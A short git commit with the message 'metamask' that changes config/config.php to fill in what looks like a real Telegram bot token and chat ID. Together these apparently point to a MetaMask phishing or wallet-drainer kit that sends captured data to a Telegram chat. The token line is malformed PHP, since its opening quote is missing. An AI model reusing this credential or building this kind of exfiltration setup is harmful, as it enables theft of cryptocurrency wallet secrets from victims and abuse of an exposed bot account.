c847a29284323823272daea04d572a81a2fbca39
Asukuebira <tupwoman@aol.com>
2025-02-16 17:36:13 -0600

    metamask

--- config/config.php
+++ config/config.php
@@ -1,5 +1,5 @@
 <?php
-$bot_token = ""; /* bot token */
-$chat_id = ""; /* chatid */
+$bot_token = 7509193792:AAHYxtBvv5I5KyQeQECJ8jQJqleORcArq4c""; /* bot token */
+$chat_id = "7462942372"; /* chatid */
 
 ?>
